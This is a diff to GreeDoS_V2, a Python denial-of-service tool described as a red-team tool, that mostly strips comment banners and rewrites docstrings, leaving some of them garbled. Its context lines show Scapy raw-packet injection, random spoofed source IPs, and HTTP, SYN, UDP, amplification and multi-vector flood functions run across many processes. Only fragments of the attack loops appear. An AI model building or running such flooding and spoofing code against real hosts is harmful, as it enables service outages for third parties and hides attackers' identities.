@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 # Copyright 2025_MrEchoFi_EbwerBrothers
 """MIT License
 
@@ -52,19 +52,17 @@ from subprocess import run
 from rich.console import Console
 from rich.panel import Panel
 
-# Import Scapy for raw packet injection
+# for raw packet injection. i have import scapy / if u use another powerful library then you can change this
 try:
     from scapy.all import IP, TCP, UDP, send
 except ImportError:
     print("Error: Scapy is not installed. Please install it using: pip install scapy")
     sys.exit(1)
 
-# Global console for terminal output
+
 console = Console()
 
-# ---------------------------------------------------------------------
-# GreeDoS ASCII Logo
-# ---------------------------------------------------------------------
+
 GreeDoS_LOGO = r"""
                                                                              
        
@@ -78,11 +76,9 @@ GreeDoS_LOGO = r"""
                                                                              
 """
 
-# ---------------------------------------------------------------------
-# Helper Functions
-# ---------------------------------------------------------------------
+# http headers for HTTP Get flood
 def random_http_headers():
-    """Generate random HTTP headers."""
+    """Generate> HTTP headers."""
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -326,7 +322,7 @@ def random_http_headers():
 
 
 def random_https_headers():
-    """Generate random HTTPS headers."""
+    """Generate HTTPS headers."""
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -531,7 +527,7 @@ def random_https_headers():
 
 
 def resolve_target(target):
-    """Resolve the target domain to an IP address."""
+   
     try:
         ip = socket.gethostbyname(target)
         return ip
@@ -540,14 +536,12 @@ def resolve_target(target):
         sys.exit(1)
 
 def dynamic_ip():
-    """Generate a random IP address for spoofing."""
+    """Generate random IP address for spoofing."""
     return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
 
-# ---------------------------------------------------------------------
-# Attack Simulation Functions
-# ---------------------------------------------------------------------
+# simulation function for attacks
 def simulate_http_flood(target, duration, thread_id, stealth=False):
-    """Simulate HTTP Flood attack."""
+   
     if not target.lower().startswith(("http://", "https://")):
         target = "http://" + target
         target = "https://" + target 
@@ -584,7 +578,7 @@ def simulate_syn_flood(target, duration, thread_id, stealth=False):
     console.log(f"[SYN Flood][Thread {thread_id}]: Completed with {count} packets.")
 
 def simulate_udp_flood(target, duration, thread_id, stealth=False):
-    """Simulate UDP Flood attack."""
+    """> UDP Flood attack."""
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
@@ -600,7 +594,7 @@ def simulate_udp_flood(target, duration, thread_id, stealth=False):
     console.log(f"[UDP Flood][Thread {thread_id}]: Completed with {count} packets.")
 
 def simulate_amplification_attack(target, duration, thread_id, stealth=False):
-    """Simulate Amplification Attack."""
+    """> Amplification Attack."""
     end_time = time.time() + duration
     count = 0
     while time.time() < end_time:
@@ -631,7 +625,7 @@ def simulate_high_speed_replay(pcap_file, interface, duration, stealth=False):
     console.log("[High-Speed Replay]: Completed.")
 
 def simulate_multi_vector_attack(target, duration, threads, stealth=False):
-    """Simulate Multi-Vector Attack with all methods running concurrently."""
+    """> Multi-Vector Attack """
     console.log(f"[Multi-Vector]: Starting multi-vector attack on {target} for {duration} seconds.")
     sub_threads = max(1, threads // 4)
     thread_group = []
@@ -657,9 +651,7 @@ def simulate_multi_vector_attack(target, duration, threads, stealth=False):
         t.join()
     console.log("[Multi-Vector]: Multi-vector attack completed.")
 
-# ---------------------------------------------------------------------
-# Multiprocessing Wrapper
-# ---------------------------------------------------------------------
+
 def run_attack_in_parallel(attack_func, target, duration, num_processes, stealth=False):
     """Run attack functions in parallel using multiprocessing."""
     processes = []
@@ -670,9 +662,7 @@ def run_attack_in_parallel(attack_func, target, duration, num_processes, stealth
     for process in processes:
         process.join()
 
-# ---------------------------------------------------------------------
-# Interactive CMD Menu
-# ---------------------------------------------------------------------
+# Terminal Menu 
 def main_menu():
     console.print(GreeDoS_LOGO, style="bold cyan", justify="center")
     console.print("[bold red]-------------------- Welcome to GreeDoS_V2 - Cybersecurity Red Team Tool --------------------[/bold red]\n", justify="center")
@@ -726,9 +716,7 @@ def main_menu():
         else:
             console.print("[bold red]Invalid choice. Please select a valid option.[/bold red]")
 
-# ---------------------------------------------------------------------
-# Main Entry Point
-# ---------------------------------------------------------------------
+
 if __name__ == "__main__":
     try:
         main_menu()
